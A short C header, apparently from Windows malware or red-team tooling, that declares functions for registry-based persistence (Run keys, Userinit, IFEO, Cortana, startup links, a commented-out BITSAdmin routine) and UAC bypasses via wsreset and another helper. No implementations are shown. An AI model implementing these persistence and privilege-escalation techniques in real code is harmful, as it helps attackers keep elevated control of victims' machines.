#ifndef REG_PERSIST_H
#define REG_PERSIST_H

BOOL modify_key_hkcu();
BOOL modify_key_hklm();
BOOL modify_key_userinit();
BOOL modify_key_ifeo();
BOOL modify_key_cortana();
BOOL link_file_startup();
//BOOL bitadmin_persis();
BOOL uac_bypass_wsreset();
BOOL uac_bypass_folhelpercleanup();

#endif